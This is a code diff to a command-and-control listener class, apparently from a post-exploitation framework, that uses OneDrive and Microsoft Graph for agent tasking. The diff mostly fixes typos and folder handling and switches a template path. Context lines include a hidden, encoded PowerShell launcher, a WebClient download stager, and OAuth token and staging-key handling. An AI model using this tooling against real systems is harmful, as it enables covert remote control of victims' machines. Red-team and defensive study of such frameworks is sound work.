@@ -78,7 +78,7 @@ class Listener(object):
                 "Value": "powershell -noP -sta -w 1 -enc ",
             },
             "StagingKey": {
-                "Description": "Staging key for intial agent negotiation.",
+                "Description": "Staging key for initial agent negotiation.",
                 "Required": True,
                 "Value": "asdf",
             },
@@ -240,7 +240,7 @@ class Listener(object):
                         "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                     )
 
-                launcher += "$wc=New-Object SYstem.Net.WebClient;"
+                launcher += "$wc=New-Object System.Net.WebClient;"
 
                 if userAgent.lower() == "default":
                     profile = listener_options["DefaultProfile"]["Value"]
@@ -338,8 +338,8 @@ class Listener(object):
         client_id = listenerOptions["ClientID"]["Value"]
         client_secret = listenerOptions["ClientSecret"]["Value"]
         refresh_token = listenerOptions["RefreshToken"]["Value"]
-        taskings_folder = listenerOptions["TaskingsFolder"]["Value"].strip("/")
-        results_folder = listenerOptions["ResultsFolder"]["Value"].strip("/")
+        taskings_folder = listenerOptions["TaskingsFolder"]["Value"]
+        results_folder = listenerOptions["ResultsFolder"]["Value"]
         redirect_uri = listenerOptions["RedirectURI"]["Value"]
         staging_key = listenerOptions["StagingKey"]["Value"]
         base_folder = listenerOptions["BaseFolder"]["Value"]
@@ -359,7 +359,7 @@ class Listener(object):
             template_options = {
                 "working_hours": working_hours,
                 "staging_key": staging_key,
-                "token:": token,
+                "token": token,
                 "refresh_token": refresh_token,
                 "client_id": client_id,
                 "client_secret": client_secret,
@@ -406,7 +406,7 @@ class Listener(object):
         client_secret = listener_options["ClientSecret"]["Value"]
         refresh_token = listener_options["RefreshToken"]["Value"]
         base_folder = listener_options["BaseFolder"]["Value"]
-        results_folder = listener_options["ResultsFolder"]["Value"].strip("/")
+        results_folder = listener_options["ResultsFolder"]["Value"]
         redirect_uri = listener_options["RedirectURI"]["Value"]
         taskings_folder = listener_options["TaskingsFolder"]["Value"]
 
@@ -418,7 +418,7 @@ class Listener(object):
                 ]
 
                 eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/http.ps1")
+                template = eng.get_template("onedrive/comms.ps1")
 
                 template_options = {
                     "token:": token,
@@ -456,6 +456,7 @@ class Listener(object):
         refresh_token,
         redirect_uri,
         language=None,
+        version="",
     ):
         """
         Generate the agent code
@@ -509,6 +510,8 @@ class Listener(object):
                 agent_code = agent_code.replace(
                     "$KillDate,", "$KillDate = '" + str(kill_date) + "',"
                 )
+
+            agent_code = agent_code.replace("REPLACE_COMMS", "")
 
             return agent_code
 
@@ -707,9 +710,9 @@ class Listener(object):
         auth_code = listener_options["AuthCode"]["Value"]
         refresh_token = listener_options["RefreshToken"]["Value"]
         base_folder = listener_options["BaseFolder"]["Value"]
-        staging_folder = listener_options["StagingFolder"]["Value"].strip("/")
-        taskings_folder = listener_options["TaskingsFolder"]["Value"].strip("/")
-        results_folder = listener_options["ResultsFolder"]["Value"].strip("/")
+        staging_folder = listener_options["StagingFolder"]["Value"]
+        taskings_folder = listener_options["TaskingsFolder"]["Value"]
+        results_folder = listener_options["ResultsFolder"]["Value"]
         redirect_uri = listener_options["RedirectURI"]["Value"]
         base_url = "https://graph.microsoft.com/v1.0"
 
